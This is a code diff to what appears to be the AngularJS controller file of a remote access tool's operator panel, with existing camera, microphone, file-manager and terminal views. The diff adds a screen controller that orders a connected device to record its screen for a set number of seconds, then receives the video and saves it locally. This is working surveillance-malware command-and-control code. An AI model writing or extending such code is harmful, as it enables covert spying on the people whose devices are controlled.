@@ -22,6 +22,10 @@ app.config(function($routeProvider) {
             templateUrl: "./views/camera.html",
             controller: "CamCtrl"
         })
+        .when("/screen", {
+            templateUrl: "./views/screen.html",
+            controller: "ScrCtrl"
+        })
         .when("/fileManager", {
             templateUrl: "./views/fileManager.html",
             controller: "FmCtrl"
@@ -539,7 +543,61 @@ app.controller("MicCtrl", function($scope, $rootScope) {
     });
 });
 
-//-----------------------Mic Controller (terminal.htm)------------------------
+//-----------------------Screen Controller (screen.htm)------------------------
+// Mic controller
+app.controller("ScrCtrl", function($scope, $rootScope) {
+    $ScrCtrl = $scope;
+    $ScrCtrl.isVideo = true;
+    var screen = CONSTANTS.orders.screen;
+
+    $ScrCtrl.$on('$destroy', function() {
+        // release resources, cancel Listner...
+        socket.removeAllListeners(screen);
+    });
+
+    $ScrCtrl.Record = (seconds) => {
+
+        if (seconds) {
+            if (seconds > 0) {
+                $rootScope.Log('Recording ' + seconds + "'s...");
+                socket.emit(ORDER, { order: screen, sec: seconds });
+            } else
+                $rootScope.Log('Seconds must be more than 0');
+
+        }
+
+    }
+
+
+    socket.on(screen, (data) => {
+        if (data.file == true) {
+            $rootScope.Log('Screen arrived', CONSTANTS.logStatus.SUCCESS);
+            $ScrCtrl.isVideo = false;
+            $ScrCtrl.$apply();
+            
+
+            $ScrCtrl.SaveVideo = () => {
+                $rootScope.Log('Saving file..');
+                var filePath = path.join(downloadsPath, data.name);
+                fs.outputFile(filePath, data.buffer, (err) => {
+                    if (err)
+                        $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
+                    else
+                        $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
+                });
+
+
+            };
+
+
+
+        }
+
+    });
+});
+
+
+//-----------------------Terminal Controller (terminal.htm)------------------------
 // Mic controller
 app.controller("TermCtrl", function($scope, $rootScope) {
     $TermCtrl = $scope;
